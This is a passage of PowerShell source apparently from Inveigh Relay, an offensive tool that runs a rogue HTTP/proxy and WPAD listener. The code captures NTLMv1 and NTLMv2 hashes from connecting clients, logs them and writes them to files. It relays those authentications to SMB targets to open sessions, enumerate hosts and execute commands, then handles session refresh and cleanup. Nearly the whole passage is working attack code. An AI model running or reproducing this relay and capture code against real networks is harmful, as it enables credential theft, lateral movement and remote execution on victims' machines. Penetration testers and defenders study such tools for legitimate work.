0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20\n                }\n                else\n                {\n                    $HTTP_response_status_code = 0x34,0x30,0x31\n                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20\n                }\n\n                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64\n            }\n        \n            if($HTTP_header_authorization.StartsWith('NTLM '))\n            {\n                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''\n                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)\n                $HTTP_connection_header_close = $false\n            \n                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')\n                {\n                    \n                    if($inveigh.SMB_relay -and $relay_step -eq 0)\n                    {\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) to SMB relay initiated by $HTTP_source_IP\") > $null\n                        $SMB_connect = Invoke-SMBConnect $process_ID_bytes $HTTP_source_IP\n                        $target = $SMB_connect[1]\n                        $SMB_client = $SMB_connect[0]\n                    \n                        if(!$target)\n                        {\n                            $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Eligible target not found\") > $null\n                            $relay_step = 0\n                        }\n                        elseif(!$SMB_client.connected)\n                        {\n\n                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                            {\n                \n                                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].\"Signing\")\n                                {\n                                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Relay target $target is not responding\") > $null\n                                    break\n                                }\n                \n                            }\n                            \n                            $relay_step = 0\n                        }\n                        else\n                        {\n                            $relay_step = 1\n                        }\n\n                        if($relay_step -eq 1)\n                        {\n                            $SMB_relay_bytes = Invoke-SMBRelayChallenge $SMB_client $HTTP_request_bytes $SMB_version $process_ID_bytes\n\n                            if($SMB_relay_bytes.Length -le 3)\n                            {\n                                $relay_step = 0\n                                $HTTP_client_close = $true\n                                $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port\n                            }\n\n                        }\n\n                        if($relay_step -eq 1)\n                        {\n                            $SMB_user_ID = $SMB_relay_bytes[34..33]\n                            $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)\n                            $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace \"-\",\"\"\n                            $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf(\"4E544C4D53535000\")\n                            $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2\n                            $SMB_domain_length = Get-UInt16DataLength ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes\n                            $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]\n                            $SMB_target_length = Get-UInt16DataLength ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes\n                            $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]\n                            $SMB_relay_target_flag = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 22)]\n                            $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]\n                            $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]\n                            $session_ID = $SMB_relay_bytes[44..51]\n                    \n                            $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +\n                                               $SMB_domain_length_offset_bytes +\n                                               0x05,0x82 +\n                                               $SMB_relay_target_flag +\n                                               0xa2 +\n                                               $SMB_relay_NTLM_challenge +\n                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +\n                                               $SMB_target_length_offset_bytes +\n                                               $SMB_relay_target_details\n                    \n                            $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\n                            $NTLM = 'NTLM ' + $NTLM_challenge_base64\n                            $NTLM_challenge = Get-SMBNTLMChallenge $SMB_relay_bytes\n\n                            if(!$inveigh.HTTP_session_table.ContainsKey(\"$ClientIPAddress`:$ClientPort\"))\n                            {\n                                $inveigh.HTTP_session_table.Add(\"$ClientIPAddress`:$ClientPort\",$HTTP_challenge)\n                            }\n                            else\n                            {\n                                $inveigh.HTTP_session_table[\"$ClientIPAddress`:$ClientPort\"] = $HTTP_challenge\n                            }\n\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target\") > $null\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP\") > $null\n                            $relay_step = 2\n                        }\n                        else\n                        {\n                            $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port\n                        }\n\n                    }\n                    else\n                    {\n                        $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port\n                    }\n\n                }\n                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')\n                {\n                    $HTTP_NTLM_length = Get-UInt16DataLength 20 $HTTP_request_bytes\n                    $HTTP_NTLM_offset = Get-UInt32DataLength 24 $HTTP_request_bytes\n                    $HTTP_NTLM_domain_length = Get-UInt16DataLength 28 $HTTP_request_bytes\n                    $HTTP_NTLM_domain_offset = Get-UInt32DataLength 32 $HTTP_request_bytes\n                    $NTLM_challenge = $inveigh.HTTP_session_table.$Session\n                       \n                    if($HTTP_NTLM_domain_length -eq 0)\n                    {\n                        $HTTP_NTLM_domain_string = $null\n                    }\n                    else\n                    {  \n                        $HTTP_NTLM_domain_string = Convert-DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes\n                    } \n                    \n                    $HTTP_NTLM_user_length = Get-UInt16DataLength 36 $HTTP_request_bytes\n                    $HTTP_NTLM_user_offset = Get-UInt32DataLength 40 $HTTP_request_bytes\n                    \n                    if($HTTP_NTLM_user_length -eq 0)\n                    {    \n                        $HTTP_NTLM_user_string = $null\n                    }\n                    else\n                    {\n                        $HTTP_NTLM_user_string = Convert-DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes\n                    }\n\n                    $HTTP_username_full = $HTTP_NTLM_domain_string + \"\\\" + $HTTP_NTLM_user_string\n                    $HTTP_NTLM_host_length = Get-UInt16DataLength 44 $HTTP_request_bytes\n                    $HTTP_NTLM_host_offset = Get-UInt32DataLength 48 $HTTP_request_bytes\n                    $HTTP_NTLM_host_string = Convert-DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes\n\n                    if($HTTP_NTLM_length -eq 24) # NTLMv1\n                    {\n                        $NTLM_type = \"NTLMv1\"\n                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace \"-\",\"\"\n                        $NTLM_response = $NTLM_response.Insert(48,':')\n                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + \"::\" + $HTTP_NTLM_domain_string + \":\" + $NTLM_response + \":\" + $NTLM_challenge\n\n                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))\n                        {     \n                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash) > $null\n                        \n                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\"))\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:\") > $null\n                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]\") > $null\n                            }\n\n                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\")))\n                            {\n                                $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash) > $null\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type written to \" + \"Inveigh-NTLMv1.txt\") > $null\n                            }\n\n                            if($inveigh.NTLMv1_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\")\n                            {\n                                $inveigh.NTLMv1_username_list.Add(\"$HTTP_source_IP $HTTP_username_full\") > $null\n                            }\n\n                        }\n\n                    }\n                    else # NTLMv2\n                    {   \n                        $NTLM_type = \"NTLMv2\"           \n                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace \"-\",\"\"\n                        $NTLM_response = $NTLM_response.Insert(32,':')\n                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + \"::\" + $HTTP_NTLM_domain_string + \":\" + $NTLM_challenge + \":\" + $NTLM_response\n                        \n                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))\n                        {\n                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash) > $null\n                        \n                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\"))\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:\") > $null\n                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]\") > $null\n                            }\n\n                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\")))\n                            {\n                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 written to \" + \"Inveigh-NTLMv2.txt\") > $null\n                            }\n\n                            if($inveigh.NTLMv2_username_list -notcontains \"$HTTP_source_IP $HTTP_username_full\")\n                            {\n                                $inveigh.NTLMv2_username_list.Add(\"$HTTP_source_IP $HTTP_username_full\") > $null\n                            }\n                        \n                        }\n\n                    }\n                    \n                    if($HTTP_NTLM_domain_string -and $HTTP_NTLM_user_string -and $HTTP_NTLM_host_string -and $HTTP_source_IP)\n                    {\n                        Invoke-SessionUpdate $HTTP_NTLM_domain_string $HTTP_NTLM_user_string $HTTP_NTLM_host_string $HTTP_source_IP\n                    }\n\n                    $HTTP_response_status_code = 0x32,0x30,0x30\n                    $HTTP_response_phrase = 0x4f,0x4b\n                    $HTTP_client_close = $true\n                    $NTLM_challenge = $null\n                    \n                    if($inveigh.SMB_relay -and $relay_step -eq 2)\n                    {\n\n                        if(!$Username -or $Username -contains $HTTP_NTLM_user_string -or $Username -contains $HTTP_username_full)\n                        {\n\n                            if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$')))\n                            {\n\n                                if($inveigh.relay_failed_login_table.$HTTP_username_full.Count -le $FailedLoginThreshold)\n                                {\n\n                                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target\") > $null\n                                    $SMB_relay_failed = Invoke-SMBRelayResponse $SMB_client $HTTP_request_bytes $SMB_version $SMB_user_ID $session_ID $process_ID_bytes\n                                    \n                                    if(!$SMB_relay_failed)\n                                    {\n                                        $inveigh.session_current = $inveigh.session_count\n                                        $inveigh.session_message_ID_table.Add($inveigh.session_count,3)\n\n                                        if($Attack -contains 'Session')\n                                        {\n                                            \n                                            if($SMB_client.Connected)\n                                            {\n                                                $inveigh.session_socket_table[$inveigh.session_count] = $SMB_client\n                                                $inveigh.session_table[$inveigh.session_count] = $session_ID\n                                                $inveigh.session_lock_table[$inveigh.session_count] = 'open'\n                                                $session_privilege = Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $true\n                                                $session_object = New-Object PSObject\n                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count\n                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $SMB_client.Client.RemoteEndpoint.Address.IPaddressToString\n                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Initiator $HTTP_source_IP\n                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $HTTP_username_full\n                                                \n                                                if($session_privilege)\n                                                {\n                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged \"yes\"\n                                                }\n                                                else\n                                                {\n                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged \"no\"\n                                                }\n\n                                                if($SMB_client.Connected)\n                                                {\n                                                    $status = \"connected\"\n                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status\n                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name \"Established\" $(Get-Date -format s)\n                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name \"Last Activity\" $(Get-Date -format s)\n                                                    $inveigh.session += $session_object\n                                                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Session $($inveigh.session_count) added to session list\") > $null\n                                                }\n\n                                            }\n\n                                        }\n\n                                        if($Attack -contains 'Enumerate' -or $Attack -contains 'Execute')\n                                        {\n\n                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                                            {\n\n                                                if($inveigh.enumerate[$i].IP -eq $target)\n                                                {\n                                                    $target_index = $i\n                                                    break\n                                                }\n\n                                            }\n\n                                            $filter_date = Get-Date\n                                        }\n\n                                        if(($attack -contains 'Enumerate' -and $SMB_client.Connected) -and\n                                        (!$inveigh.enumerate[$target_index].Enumerate -or\n                                        (New-TimeSpan $inveigh.enumerate[$target_index].Enumerate $filter_date).Minutes -gt $RepeatEnumerate))\n                                        {\n                                            Invoke-SMBRelayEnum $SMB_client $SMB_user_ID $session_ID $process_ID_bytes $Enumerate $EnumerateGroup\n                                        }\n\n                                        if((($session_privilege -and $Attack -contains 'Execute' -and $Attack -contains 'Session' -and $SMB_client.Connected) -or\n                                        ($Attack -contains 'Execute' -and $Attack -notcontains 'Session' -and $SMB_client.Connected)) -and\n                                        (!$inveigh.enumerate[$target_index].Execute -or (New-TimeSpan $inveigh.enumerate[$target_index].Execute $filter_date).Minutes -gt $RepeatExecute))\n                                        {\n                                            Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $false\n                                            $inveigh.enumerate[$target_index].Execute = $(Get-Date -format s)\n                                        }\n\n                                        if(!$SMB_client.Connected)\n                                        {\n                                            $inveigh.session[$inveigh.session_count] | Where-Object {$_.Status = \"disconnected\"}\n                                        }\n\n                                        $inveigh.session_count++\n                                    }\n\n                                    if($Attack -notcontains 'Session' -and !$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')\n                                    {\n\n                                        if($Attack -contains 'Enumerate')\n                                        {\n\n                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                                            {\n\n                                                if($inveigh.enumerate[$i].Enumerate)\n                                                {\n                                                    $targets_enumerate_complete = @($inveigh.enumerate[$i].IP)\n                                                }\n\n                                            }\n\n                                            if($inveigh.target_list -and $targets_enumerated)\n                                            {\n                                                $targets_enumerate_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_enumerate_complete -PassThru | Where-Object {$_.SideIndicator -eq \"<=\"}\n                                            }\n\n                                        }\n\n                                        if($Attack -contains 'Execute')\n                                        {\n\n                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                                            {\n\n                                                if($inveigh.enumerate[$i].Execute)\n                                                {\n                                                    $targets_execute_complete = @($inveigh.execute[$i].IP)\n                                                }\n\n                                            }\n\n                                            if($inveigh.target_list -and $targets_enumerated)\n                                            {\n                                                $targets_execute_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_execute_complete -PassThru | Where-Object {$_.SideIndicator -eq \"<=\"}\n                                            }\n\n                                        }\n\n                                        if($Attack -notcontains 'Session' -or (!$targets_enumerate_remaining -and $Attack -contains 'Enumerate' -and $Attack -notcontains 'Execute') -or\n                                        (!$targets_execute_remaining -and $Attack -contains 'Execute' -and $Attack -notcontains 'Enumerate') -or\n                                        (!$targets_enumerate_remaining -and !$targets_execute_remaining -and $Attack -contains 'Enumerate' -and $Attack -contains 'Execute'))\n                                        {\n                                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay auto disabled due to success\") > $null\n                                            $inveigh.SMB_relay = $false\n                                        }\n\n                                    }\n\n                                    $relay_step = 0\n\n                                }\n                                else\n                                {\n                                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded failed login limit\") > $null\n                                    $SMB_client.Close()\n                                    $relay_step = 0\n                                }\n\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay stopped since $HTTP_NTLM_user_string appears to be a machine account\") > $null\n                                $SMB_client.Close()\n                                $relay_step = 0\n                            }\n\n                        }\n                        else\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list\") > $null\n                            $SMB_client.Close()\n                            $relay_step = 0\n                        }\n\n                    }\n\n                    if($proxy_listener)\n                    {\n                        $HTTP_send = $false\n                    }\n\n                }\n        \n            }\n\n            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))\n            {\n                $HTTP_message = $WPADResponse\n                $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: application/x-ns-proxy-autoconfig\")\n            }\n\n            $HTTP_timestamp = Get-Date -format r\n            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)\n            $HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)\n\n            if($HTTP_request_raw_URL -notmatch '/wpad.dat' -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)\n            { \n                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)\n            }\n            \n            $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary\n            $packet_HTTPResponse.Add(\"HTTPResponse_ResponseVersion\",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))\n            $packet_HTTPResponse.Add(\"HTTPResponse_StatusCode\",$HTTP_response_status_code + [Byte[]](0x20))\n            $packet_HTTPResponse.Add(\"HTTPResponse_ResponsePhrase\",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))\n\n            if($HTTP_connection_header_close)\n            {\n                $HTTP_connection_header = [System.Text.Encoding]::UTF8.GetBytes(\"Connection: close\")\n                $packet_HTTPResponse.Add(\"HTTPResponse_Connection\",$HTTP_connection_header + [Byte[]](0x0d,0x0a))\n            }\n\n            $packet_HTTPResponse.Add(\"HTTPResponse_Server\",[System.Text.Encoding]::UTF8.GetBytes(\"Server: Microsoft-HTTPAPI/2.0\") + [Byte[]](0x0d,0x0a))\n            $packet_HTTPResponse.Add(\"HTTPResponse_TimeStamp\",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))\n            $packet_HTTPResponse.Add(\"HTTPResponse_ContentLength\",[System.Text.Encoding]::UTF8.GetBytes(\"Content-Length: $($HTTP_message_bytes.Length)\") + [Byte[]](0x0d,0x0a))\n\n            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_AuthenticateHeader\",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_header_content_type)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_ContentType\",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_header_cache_control)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_CacheControl\",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))\n            }\n\n            if($HTTP_send)\n            {\n                $packet_HTTPResponse.Add(\"HTTPResponse_Message\",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)\n                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse\n                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)\n                $HTTP_stream.Flush()\n            }\n\n            Start-Sleep -m 10\n            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL\n\n            if($HTTP_client_close)\n            {\n\n                if($proxy_listener)\n                {\n                    $HTTP_client.Client.Close()\n                }\n                else\n                {\n                    $HTTP_client.Close()\n                }\n\n            }\n\n        }\n        else\n        {\n\n            if($HTTP_client_handle_old -eq $HTTP_client.Client.Handle)\n            {\n                $HTTP_reset++\n            }\n            else\n            {\n                $HTTP_reset = 0\n            }\n\n            if($HTTP_connection_header_close -or $HTTP_reset -gt 20)\n            {\n                $HTTP_client.Close()\n                $HTTP_reset = 0\n            }\n            else\n            {\n                Start-Sleep -m 100\n            }\n\n        }\n\n    }\n\n    $HTTP_client.Close()\n    $HTTP_listener.Stop()\n}\n\n# Control Relay Loop ScriptBlock\n$control_relay_scriptblock = \n{\n    param ($ConsoleQueueLimit,$RelayAutoExit,$RunTime)\n    \n    function Invoke-OutputQueueLoop\n    {\n\n        while($inveigh.output_queue.Count -gt 0)\n        {\n            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null\n\n            if($inveigh.file_output)\n            {\n\n                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \") -or $inveigh.output_queue[0].StartsWith(\"[!] \") -or $inveigh.output_queue[0].StartsWith(\"[-] \"))\n                {\n                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n                }\n                else\n                {\n                    $inveigh.log_file_queue.Add(\"[redacted]\") > $null    \n                }\n\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n    }\n\n    function Stop-InveighRunspace\n    {\n        param ([String]$Message)\n        \n        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))\n        {\n\n            try\n            {\n                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store(\"My\",\"LocalMachine\")\n                $certificate_store.Open('ReadWrite')\n                $certificates = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -Like \"CN=\" + $inveigh.certificate_issuer})\n\n                foreach($certificate in $certificates)\n                {\n                    $certificate_store.Remove($certificate)\n                }\n\n                $certificate_store.Close()\n            }\n            catch\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]\") > $null\n            }\n\n        }\n\n        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)\n        {\n            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n            {\n                \n                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)\n                {\n\n                    try\n                    {\n                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone\n                        $inveigh.ADIDNS_table.$ADIDNS_host = $null\n                    }\n                    catch\n                    {\n                        $error_message = $_.Exception.Message\n                        $error_message = $error_message -replace \"`n\",\"\"\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed\") > $null\n                    }\n\n                }\n\n            }\n\n        }\n        \n        if($inveigh.relay_running)\n        {\n            Start-Sleep -m 100\n\n            if($Message)\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message\") > $null\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh Relay is exiting\") > $null  \n            }\n\n            if(!$inveigh.running)\n            {\n                Invoke-OutputQueueLoop\n                Start-Sleep -m 100\n            }\n\n            $inveigh.relay_running = $false\n        }\n\n        if($inveigh.running)\n        {\n\n            if($Message)\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message\") > $null\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Inveigh is exiting\") > $null  \n            }\n\n            Invoke-OutputQueueLoop\n\n            if(!$elevated_privilege)\n            {\n                Start-Sleep -s 3\n            }\n\n            $inveigh.running = $false\n        }\n\n        $inveigh.ADIDNS = $null\n        $inveigh.HTTPS = $false\n    }\n\n    if($RunTime)\n    {    \n        $control_timeout = New-TimeSpan -Minutes $RunTime\n        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n    }\n       \n    while($inveigh.relay_running -and !$inveigh.running)\n    {\n\n        if($RelayAutoExit -eq 'Y' -and !$inveigh.SMB_relay)\n        {\n            Start-Sleep -S 5\n            Stop-InveighRunspace \"disabled relay\"\n        }\n\n        if($RunTime)\n        {\n\n            if($control_stopwatch.Elapsed -ge $control_timeout)\n            {\n                Stop-InveighRunspace \"reaching run time\"\n            }\n\n        }\n\n        if($inveigh.file_output -and -not $inveigh.control)\n        {\n\n            while($inveigh.log_file_queue.Count -gt 0)\n            {\n                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append\n                $inveigh.log_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.NTLMv1_file_queue.Count -gt 0)\n            {\n                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append\n                $inveigh.NTLMv1_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.NTLMv2_file_queue.Count -gt 0)\n            {\n                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append\n                $inveigh.NTLMv2_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.cleartext_file_queue.Count -gt 0)\n            {\n                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append\n                $inveigh.cleartext_file_queue.RemoveAt(0)\n            }\n\n            while($inveigh.form_input_file_queue.Count -gt 0)\n            {\n                $inveigh.form_input_file_queue[0]|Out-File $inveigh.form_input_out_file -Append\n                $inveigh.form_input_file_queue.RemoveAt(0)\n            }\n        \n        }\n\n        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)\n        {\n\n            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)\n            {\n                $inveigh.console_queue.RemoveAt(0)\n            }\n\n        }\n\n        if(!$inveigh.status_output -and !$inveigh.running)\n        {\n            Invoke-OutputQueueLoop\n        }\n\n        Start-Sleep -m 5\n\n        if($inveigh.stop)\n        {\n            $inveigh.console_queue.Clear()\n            Stop-InveighRunspace\n        }\n\n    }\n\n }\n\n# Session Refresh Loop ScriptBlock\n$session_refresh_scriptblock = \n{\n    param ($SessionRefresh)\n\n    $process_ID_bytes = Get-ProcessIDArray\n\n    while($inveigh.relay_running)\n    {\n\n        if($inveigh.session_socket_table.Count -gt 0)\n        {\n            $session = 0\n\n            while($session -lt $inveigh.session_socket_table.Count)\n            {\n                $session_timespan =  New-TimeSpan $inveigh.session[$session].\"Last Activity\" $(Get-Date)\n                \n                if($inveigh.session_socket_table[$session].Connected -and $inveigh.session_lock_table[$session] -eq 'open' -and $session_timespan.Minutes -ge $SessionRefresh)\n                {\n                    